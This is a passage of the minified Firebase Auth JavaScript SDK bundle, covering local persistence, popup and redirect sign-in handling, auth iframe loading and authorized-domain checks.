 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class RL{constructor(e){this.target=e,this.handlers=new Set}removeMessageHandler(e){e.messageChannel&&(e.messageChannel.port1.removeEventListener("message",e.onMessage),e.messageChannel.port1.close()),this.handlers.delete(e)}async _send(e,n,r=50){const i=typeof MessageChannel<"u"?new MessageChannel:null;if(!i)throw new Error("connection_unavailable");let s,o;return new Promise((a,c)=>{const u=Mv("",20);i.port1.start();const p=setTimeout(()=>{c(new Error("unsupported_event"))},r);o={messageChannel:i,onMessage(f){const h=f;if(h.data.eventId===u)switch(h.data.status){case"ack":clearTimeout(p),s=setTimeout(()=>{c(new Error("timeout"))},3e3);break;case"done":clearTimeout(s),a(h.data.response);break;default:clearTimeout(p),clearTimeout(s),c(new Error("invalid_response"));break}}},this.handlers.add(o),i.port1.addEventListener("message",o.onMessage),this.target.postMessage({eventType:e,eventId:u,data:n},[i.port2])}).finally(()=>{o&&this.removeMessageHandler(o)})}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function nr(){return window}function AL(t){nr().location.href=t}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Nb(){return typeof nr().WorkerGlobalScope<"u"&&typeof nr().importScripts=="function"}async function OL(){if(!(navigator!=null&&navigator.serviceWorker))return null;try{return(await navigator.serviceWorker.ready).active}catch{return null}}function DL(){var t;return((t=navigator==null?void 0:navigator.serviceWorker)===null||t===void 0?void 0:t.controller)||null}function jL(){return Nb()?self:null}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const kb="firebaseLocalStorageDb",ML=1,Rd="firebaseLocalStorage",Pb="fbase_key";class yc{constructor(e){this.request=e}toPromise(){return new Promise((e,n)=>{this.request.addEventListener("success",()=>{e(this.request.result)}),this.request.addEventListener("error",()=>{n(this.request.error)})})}}function kh(t,e){return t.transaction([Rd],e?"readwrite":"readonly").objectStore(Rd)}function LL(){const t=indexedDB.deleteDatabase(kb);return new yc(t).toPromise()}function zm(){const t=indexedDB.open(kb,ML);return new Promise((e,n)=>{t.addEventListener("error",()=>{n(t.error)}),t.addEventListener("upgradeneeded",()=>{const r=t.result;try{r.createObjectStore(Rd,{keyPath:Pb})}catch(i){n(i)}}),t.addEventListener("success",async()=>{const r=t.result;r.objectStoreNames.contains(Rd)?e(r):(r.close(),await LL(),e(await zm()))})})}async function Mw(t,e,n){const r=kh(t,!0).put({[Pb]:e,value:n});return new yc(r).toPromise()}async function FL(t,e){const n=kh(t,!1).get(e),r=await new yc(n).toPromise();return r===void 0?null:r.value}function Lw(t,e){const n=kh(t,!0).delete(e);return new yc(n).toPromise()}const UL=800,$L=3;class Rb{constructor(){this.type="LOCAL",this._shouldAllowMigration=!0,this.listeners={},this.localCache={},this.pollTimer=null,this.pendingWrites=0,this.receiver=null,this.sender=null,this.serviceWorkerReceiverAvailable=!1,this.activeServiceWorker=null,this._workerInitializationPromise=this.initializeServiceWorkerMessaging().then(()=>{},()=>{})}async _openDb(){return this.db?this.db:(this.db=await zm(),this.db)}async _withRetries(e){let n=0;for(;;)try{const r=await this._openDb();return await e(r)}catch(r){if(n++>$L)throw r;this.db&&(this.db.close(),this.db=void 0)}}async initializeServiceWorkerMessaging(){return Nb()?this.initializeReceiver():this.initializeSender()}async initializeReceiver(){this.receiver=Nh._getInstance(jL()),this.receiver._subscribe("keyChanged",async(e,n)=>({keyProcessed:(await this._poll()).includes(n.key)})),this.receiver._subscribe("ping",async(e,n)=>["keyChanged"])}async initializeSender(){var e,n;if(this.activeServiceWorker=await OL(),!this.activeServiceWorker)return;this.sender=new RL(this.activeServiceWorker);const r=await this.sender._send("ping",{},800);r&&!((e=r[0])===null||e===void 0)&&e.fulfilled&&!((n=r[0])===null||n===void 0)&&n.value.includes("keyChanged")&&(this.serviceWorkerReceiverAvailable=!0)}async notifyServiceWorker(e){if(!(!this.sender||!this.activeServiceWorker||DL()!==this.activeServiceWorker))try{await this.sender._send("keyChanged",{key:e},this.serviceWorkerReceiverAvailable?800:50)}catch{}}async _isAvailable(){try{if(!indexedDB)return!1;const e=await zm();return await Mw(e,Pd,"1"),await Lw(e,Pd),!0}catch{}return!1}async _withPendingWrite(e){this.pendingWrites++;try{await e()}finally{this.pendingWrites--}}async _set(e,n){return this._withPendingWrite(async()=>(await this._withRetries(r=>Mw(r,e,n)),this.localCache[e]=n,this.notifyServiceWorker(e)))}async _get(e){const n=await this._withRetries(r=>FL(r,e));return this.localCache[e]=n,n}async _remove(e){return this._withPendingWrite(async()=>(await this._withRetries(n=>Lw(n,e)),delete this.localCache[e],this.notifyServiceWorker(e)))}async _poll(){const e=await this._withRetries(i=>{const s=kh(i,!1).getAll();return new yc(s).toPromise()});if(!e)return[];if(this.pendingWrites!==0)return[];const n=[],r=new Set;if(e.length!==0)for(const{fbase_key:i,value:s}of e)r.add(i),JSON.stringify(this.localCache[i])!==JSON.stringify(s)&&(this.notifyListeners(i,s),n.push(i));for(const i of Object.keys(this.localCache))this.localCache[i]&&!r.has(i)&&(this.notifyListeners(i,null),n.push(i));return n}notifyListeners(e,n){this.localCache[e]=n;const r=this.listeners[e];if(r)for(const i of Array.from(r))i(n)}startPolling(){this.stopPolling(),this.pollTimer=setInterval(async()=>this._poll(),UL)}stopPolling(){this.pollTimer&&(clearInterval(this.pollTimer),this.pollTimer=null)}_addListener(e,n){Object.keys(this.listeners).length===0&&this.startPolling(),this.listeners[e]||(this.listeners[e]=new Set,this._get(e)),this.listeners[e].add(n)}_removeListener(e,n){this.listeners[e]&&(this.listeners[e].delete(n),this.listeners[e].size===0&&delete this.listeners[e]),Object.keys(this.listeners).length===0&&this.stopPolling()}}Rb.type="LOCAL";const zL=Rb;new mc(3e4,6e4);/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function BL(t,e){return e?xr(e):(ee(t._popupRedirectResolver,t,"argument-error"),t._popupRedirectResolver)}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Lv extends Dv{constructor(e){super("custom","custom"),this.params=e}_getIdTokenResponse(e){return vo(e,this._buildIdpRequest())}_linkToIdToken(e,n){return vo(e,this._buildIdpRequest(n))}_getReauthenticationResolver(e){return vo(e,this._buildIdpRequest())}_buildIdpRequest(e){const n={requestUri:this.params.requestUri,sessionId:this.params.sessionId,postBody:this.params.postBody,tenantId:this.params.tenantId,pendingToken:this.params.pendingToken,returnSecureToken:!0,returnIdpCredential:!0};return e&&(n.idToken=e),n}}function VL(t){return Eb(t.auth,new Lv(t),t.bypassAuthState)}function HL(t){const{auth:e,user:n}=t;return ee(n,e,"internal-error"),_L(n,new Lv(t),t.bypassAuthState)}async function WL(t){const{auth:e,user:n}=t;return ee(n,e,"internal-error"),yL(n,new Lv(t),t.bypassAuthState)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ab{constructor(e,n,r,i,s=!1){this.auth=e,this.resolver=r,this.user=i,this.bypassAuthState=s,this.pendingPromise=null,this.eventManager=null,this.filter=Array.isArray(n)?n:[n]}execute(){return new Promise(async(e,n)=>{this.pendingPromise={resolve:e,reject:n};try{this.eventManager=await this.resolver._initialize(this.auth),await this.onExecution(),this.eventManager.registerConsumer(this)}catch(r){this.reject(r)}})}async onAuthEvent(e){const{urlResponse:n,sessionId:r,postBody:i,tenantId:s,error:o,type:a}=e;if(o){this.reject(o);return}const c={auth:this.auth,requestUri:n,sessionId:r,tenantId:s||void 0,postBody:i||void 0,user:this.user,bypassAuthState:this.bypassAuthState};try{this.resolve(await this.getIdpTask(a)(c))}catch(u){this.reject(u)}}onError(e){this.reject(e)}getIdpTask(e){switch(e){case"signInViaPopup":case"signInViaRedirect":return VL;case"linkViaPopup":case"linkViaRedirect":return WL;case"reauthViaPopup":case"reauthViaRedirect":return HL;default:Ln(this.auth,"internal-error")}}resolve(e){Or(this.pendingPromise,"Pending promise was never set"),this.pendingPromise.resolve(e),this.unregisterAndCleanUp()}reject(e){Or(this.pendingPromise,"Pending promise was never set"),this.pendingPromise.reject(e),this.unregisterAndCleanUp()}unregisterAndCleanUp(){this.eventManager&&this.eventManager.unregisterConsumer(this),this.pendingPromise=null,this.cleanUp()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const KL=new mc(2e3,1e4);class so extends Ab{constructor(e,n,r,i,s){super(e,n,i,s),this.provider=r,this.authWindow=null,this.pollId=null,so.currentPopupAction&&so.currentPopupAction.cancel(),so.currentPopupAction=this}async executeNotNull(){const e=await this.execute();return ee(e,this.auth,"internal-error"),e}async onExecution(){Or(this.filter.length===1,"Popup operations only handle one event");const e=Mv();this.authWindow=await this.resolver._openPopup(this.auth,this.provider,this.filter[0],e),this.authWindow.associatedEvent=e,this.resolver._originValidation(this.auth).catch(n=>{this.reject(n)}),this.resolver._isIframeWebStorageSupported(this.auth,n=>{n||this.reject(tr(this.auth,"web-storage-unsupported"))}),this.pollUserCancellation()}get eventId(){var e;return((e=this.authWindow)===null||e===void 0?void 0:e.associatedEvent)||null}cancel(){this.reject(tr(this.auth,"cancelled-popup-request"))}cleanUp(){this.authWindow&&this.authWindow.close(),this.pollId&&window.clearTimeout(this.pollId),this.authWindow=null,this.pollId=null,so.currentPopupAction=null}pollUserCancellation(){const e=()=>{var n,r;if(!((r=(n=this.authWindow)===null||n===void 0?void 0:n.window)===null||r===void 0)&&r.closed){this.pollId=window.setTimeout(()=>{this.pollId=null,this.reject(tr(this.auth,"popup-closed-by-user"))},8e3);return}this.pollId=window.setTimeout(e,KL.get())};e()}}so.currentPopupAction=null;/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const GL="pendingRedirect",Fu=new Map;class qL extends Ab{constructor(e,n,r=!1){super(e,["signInViaRedirect","linkViaRedirect","reauthViaRedirect","unknown"],n,void 0,r),this.eventId=null}async execute(){let e=Fu.get(this.auth._key());if(!e){try{const r=await YL(this.resolver,this.auth)?await super.execute():null;e=()=>Promise.resolve(r)}catch(n){e=()=>Promise.reject(n)}Fu.set(this.auth._key(),e)}return this.bypassAuthState||Fu.set(this.auth._key(),()=>Promise.resolve(null)),e()}async onAuthEvent(e){if(e.type==="signInViaRedirect")return super.onAuthEvent(e);if(e.type==="unknown"){this.resolve(null);return}if(e.eventId){const n=await this.auth._redirectUserForId(e.eventId);if(n)return this.user=n,super.onAuthEvent(e);this.resolve(null)}}async onExecution(){}cleanUp(){}}async function YL(t,e){const n=JL(e),r=XL(t);if(!await r._isAvailable())return!1;const i=await r._get(n)==="true";return await r._remove(n),i}function QL(t,e){Fu.set(t._key(),e)}function XL(t){return xr(t._redirectPersistence)}function JL(t){return Lu(GL,t.config.apiKey,t.name)}async function ZL(t,e,n=!1){if(Ut(t.app))return Promise.reject(Sr(t));const r=js(t),i=BL(r,e),o=await new qL(r,i,n).execute();return o&&!n&&(delete o.user._redirectEventId,await r._persistUserIfCurrent(o.user),await r._setRedirectUser(null,e)),o}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const e4=10*60*1e3;class t4{constructor(e){this.auth=e,this.cachedEventUids=new Set,this.consumers=new Set,this.queuedRedirectEvent=null,this.hasHandledPotentialRedirect=!1,this.lastProcessedEventTime=Date.now()}registerConsumer(e){this.consumers.add(e),this.queuedRedirectEvent&&this.isEventForConsumer(this.queuedRedirectEvent,e)&&(this.sendToConsumer(this.queuedRedirectEvent,e),this.saveEventToCache(this.queuedRedirectEvent),this.queuedRedirectEvent=null)}unregisterConsumer(e){this.consumers.delete(e)}onEvent(e){if(this.hasEventBeenHandled(e))return!1;let n=!1;return this.consumers.forEach(r=>{this.isEventForConsumer(e,r)&&(n=!0,this.sendToConsumer(e,r),this.saveEventToCache(e))}),this.hasHandledPotentialRedirect||!n4(e)||(this.hasHandledPotentialRedirect=!0,n||(this.queuedRedirectEvent=e,n=!0)),n}sendToConsumer(e,n){var r;if(e.error&&!Ob(e)){const i=((r=e.error.code)===null||r===void 0?void 0:r.split("auth/")[1])||"internal-error";n.onError(tr(this.auth,i))}else n.onAuthEvent(e)}isEventForConsumer(e,n){const r=n.eventId===null||!!e.eventId&&e.eventId===n.eventId;return n.filter.includes(e.type)&&r}hasEventBeenHandled(e){return Date.now()-this.lastProcessedEventTime>=e4&&this.cachedEventUids.clear(),this.cachedEventUids.has(Fw(e))}saveEventToCache(e){this.cachedEventUids.add(Fw(e)),this.lastProcessedEventTime=Date.now()}}function Fw(t){return[t.type,t.eventId,t.sessionId,t.tenantId].filter(e=>e).join("-")}function Ob({type:t,error:e}){return t==="unknown"&&(e==null?void 0:e.code)==="auth/no-auth-event"}function n4(t){switch(t.type){case"signInViaRedirect":case"linkViaRedirect":case"reauthViaRedirect":return!0;case"unknown":return Ob(t);default:return!1}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function r4(t,e={}){return Ji(t,"GET","/v1/projects",e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const i4=/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/,s4=/^https?/;async function o4(t){if(t.config.emulator)return;const{authorizedDomains:e}=await r4(t);for(const n of e)try{if(a4(n))return}catch{}Ln(t,"unauthorized-domain")}function a4(t){const e=Fm(),{protocol:n,hostname:r}=new URL(e);if(t.startsWith("chrome-extension://")){const o=new URL(t);return o.hostname===""&&r===""?n==="chrome-extension:"&&t.replace("chrome-extension://","")===e.replace("chrome-extension://",""):n==="chrome-extension:"&&o.hostname===r}if(!s4.test(n))return!1;if(i4.test(t))return r===t;const i=t.replace(/\./g,"\\.");return new RegExp("^(.+\\."+i+"|"+i+")$","i").test(r)}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const l4=new mc(3e4,6e4);function Uw(){const t=nr().___jsl;if(t!=null&&t.H){for(const e of Object.keys(t.H))if(t.H[e].r=t.H[e].r||[],t.H[e].L=t.H[e].L||[],t.H[e].r=[...t.H[e].L],t.CP)for(let n=0;n<t.CP.length;n++)t.CP[n]=null}}function c4(t){return new Promise((e,n)=>{var r,i,s;function o(){Uw(),gapi.load("gapi.iframes",{callback:()=>{e(gapi.iframes.getContext())},ontimeout:()=>{Uw(),n(tr(t,"network-request-failed"))},timeout:l4.get()})}if(!((i=(r=nr().gapi)===null||r===void 0?void 0:r.iframes)===null||i===void 0)&&i.Iframe)e(gapi.iframes.getContext());else if(!((s=nr().gapi)===null||s===void 0)&&s.load)o();else{const a=eL("iframefcb");return nr()[a]=()=>{gapi.load?o():n(tr(t,"network-request-failed"))},vb(`${ZM()}?onload=${a}`).catch(c=>n(c))}}).catch(e=>{throw Uu=null,e})}let Uu=null;function u4(t){return Uu=Uu||c4(t),Uu}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const d4=new mc(5e3,15e3),h4="__/auth/iframe",f4="emulator/auth/iframe",p4={style:{position:"absolute",top:"-100px",width:"1px",height:"1px"},"aria-hidden":"true",tabindex:"-1"},m4=new Map([["identitytoolkit.googleapis.com","p"],["staging-identitytoolkit.sandbox.googleapis.com","s"],["test-identitytoolkit.sandbox.googleapis.com","t"]]);function g4(t){const e=t.config;ee(e.authDomain,t,"auth-domain-config-required");const n=e.emulator?Rv(e,f4):`https://${t.config.authDomain}/${h4}`,r={apiKey:e.apiKey,appName:t.name,v:Qi},i=m4.get(t.config.apiHost);i&&(r.eid=i);const s=t._getFrameworks();return s.length&&(r.fw=s.join(",")),`${n}?${ra(r).slice(1)}`}async function v4(t){const e=await u4(t),n=nr().gapi;return ee(n,t,"internal-error"),e.open({where:document.body,url:g4(t),messageHandlersFilter:n.iframes.CROSS_ORIGIN_IFRAMES_FILTER,attributes:p4,dontclear:!0},r=>new Promise(async(i,s)=>{await r.restyle({setHideOnLeave:!1});const o=tr(t,"network-request-failed"),a=nr().setTimeout(()=>{s(o)},d4.get());function c(){nr().clearTimeout(a),i(r)}r.ping(c).then(c,()=>{s(o)})}))}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const y4={location:"yes",resizable:"yes",statusbar:"yes",toolbar:"no"},_4=500,w4=600,x4="_blank",E4="http://localhost";class $w{constructor(e){this.window=e,this.associatedEvent=null}close(){if(this.window)try{this.window.close()}catch{}}}function C4(t,e,n,r=_4,i=w4){const s=Math.max((window.screen.availHeight-i)/2,0).toString(),o=Math.max((window.screen.availWidth-r)/2,0).toString();let a="";const c=Object.assign(Object.assign({},y4),{width:r.toString(),height:i.toString(),top:s,left:o}),u=Ot().toLowerCase();n&&(a=ub(u)?x4:n),lb(u)&&(e=e||E4,c.scrollbars="yes");const p=Object.entries(c).reduce((h,[E,_])=>`${h}${E}=${_},`,"");if(HM(u)&&a!=="_self")return S4(e||"",a),new $w(null);const f=window.open(e||"",a,p);ee(f,t,"popup-blocked");try{f.focus()}catch{}return new $w(f)}function S4(t,e){const n=document.createElement("a");n.href=t,n.target=e;const r=document.createEvent("MouseEvent");r.initMouseEvent("click",!0,!0,window,1,0,0,0,0,!1,!1,!1,!1,1,null),n.dispatchEvent(r)}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const b4="__/auth/handler",T4="emulator/auth/handler",I4=encodeURIComponent("fac");async function zw(t,e,n,r,i,s){ee(t.config.authDomain,t,"auth-domain-config-required"),ee(t.config.apiKey,t,"invalid-api-key");const o={apiKey:t.config.apiKey,appName:t.name,authType:n,redirectUrl:r,v:Qi,eventId:i};if(e instanceof wb){e.setDefaultLanguage(t.languageCode),o.providerId=e.providerId||"",Am(e.getCustomParameters())||(o.customParameters=JSON.stringify(e.getCustomParameters()));for(const[p,f]of Object.entries({}))o[p]=f}if(e instanceof vc){const p=e.getScopes().filter(f=>f!=="");p.length>0&&(o.scopes=p.join(","))}t.tenantId&&(o.tid=t.tenantId);const a=o;for(const p of Object.keys(a))a[p]===void 0&&delete a[p];const c=await t._getAppCheckToken(),u=c?`#${I4}=${encodeURIComponent(c)}`:"";return`${N4(t)}?${ra(a).slice(1)}${u}`}function N4({config:t}){return t.emulator?Rv(t,T4):`https://${t.authDomain}/${b4}`}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const sp="webStorageSupport";class k4{constructor(){this.eventManagers={},this.iframes={},this.originValidationPromises={},this._redirectPersistence=Ib,this._completeRedirectFn=ZL,this._overrideRedirectResult=QL}async _openPopup(e,n,r,i){var s;Or((s=this.eventManagers[e._key()])===null||s===void 0?void 0:s.manager,"_initialize() not called before _openPopup()");const o=await zw(e,n,r,Fm(),i);return C4(e,o,Mv())}async _openRedirect(e,n,r,i){await this._originValidation(e);const s=await zw(e,n,r,Fm(),i);return AL(s),new Promise(()=>{})}_initialize(e){const n=e._key();if(this.eventManagers[n]){const{manager:i,promise:s}=this.eventManagers[n];return i?Promise.resolve(i):(Or(s,"If manager is not set, promise should be"),s)}const r=this.initAndGetManager(e);return this.eventManagers[n]={promise:r},r.catch(()=>{delete this.eventManagers[n]}),r}async initAndGetManager(e){const n=await v4(e),r=new t4(e);return n.register("authEvent",i=>(ee(i==null?void 0:i.authEvent,e,"invalid-auth-event"),{status:r.onEvent(i.authEvent)?"ACK":"ERROR"}),gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER),this.eventManagers[e._key()]={manager:r},this.iframes[e._key()]=n,r}_isIframeWebStorageSupported(e,n){this.iframes[e._key()].send(sp,{type:sp},i=>{var s;const o=(s=i==null?void 0:i[0])===null||s===void 0?void 0:s[sp];o!==void 0&&n(!!o),Ln(e,"internal-error")},gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER)}_originValidation(e){const n=e._key();return this.originValidationPromises[n]||(this.originValidationPromises[n]=o4(e)),this.originValidationPromises[n]}get _shouldInitProactively(){return mb()||cb()||Ov()}}const P4=k4;var Bw="@firebase/auth",Vw="1.10.0";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class R4{constructor(e){this.auth=e,this.internalListeners=new Map}getUid(){var e;return this.assertAuthConfigured(),((e=this.auth.currentUser)===null||e===void 0?void 0:e.uid)||null}async getToken(e){return this.assertAuthConfigured(),await this.auth._initializationPromise,this.auth.currentUser?{accessToken:await this.auth.currentUser.getIdToken(e)}:null}addAuthTokenListener(e){if(this.assertAuthConfigured(),this.internalListeners.has(e))return;const n=this.auth.onIdTokenChanged(r=>{e((r==null?void 0:r.stsTokenManager.accessToken)||null)});this.internalListeners.set(e,n),this.updateProactiveRefresh()}removeAuthTokenListener(e){this.assertAuthConfigured();const n=this.internalListeners.get(e);n&&(this.internalListeners.delete(e),n(),this.updateProactiveRefresh())}assertAuthConfigured(){ee(this.auth._initializationPromise,"dependent-sdk-initialized-before-auth")}updateProactiveRefresh(){this.internalListeners.size>0?this.auth._startProactiveRefresh():this.auth._stopProactiveRefresh()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function A4(t){switch(t){case"Node":return"node";case"ReactNative":return"rn";case"Worker":return"webworker";case"Cordova":return"cordova";case"WebExtension":return"web-extension";default:return}}function O4(t){Li(new Rr("auth",(e,{options:n})=>{const r=e.getProvider("app").getImmediate(),i=e.getProvider("heartbeat"),s=e.getProvider("app-check-internal"),{apiKey:o,authDomain:a}=r.options;ee(o&&!o.includes(":"),"invalid-api-key",{appName:r.name});const c={apiKey:o,authDomain:a,clientPlatform:t,apiHost:"identitytoolkit.googleapis.com",tokenApiHost:"securetoken.googleapis.com",apiScheme:"https",sdkClientVersion:gb(t)},u=new QM(r,i,s,c);return oL(u,n),u},"PUBLIC").setInstantiationMode("EXPLICIT").setInstanceCreatedCallback((e,n,r)=>{e.getProvider("auth-internal").initialize()})),Li(new Rr("auth-internal",e=>{const n=js(e.getProvider("auth").getImmediate());return(r=>new R4(r))(n)},"PRIVATE").setInstantiationMode("EXPLICIT")),mn(Bw,Vw,A4(t)),mn(Bw,Vw,"esm2017")}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
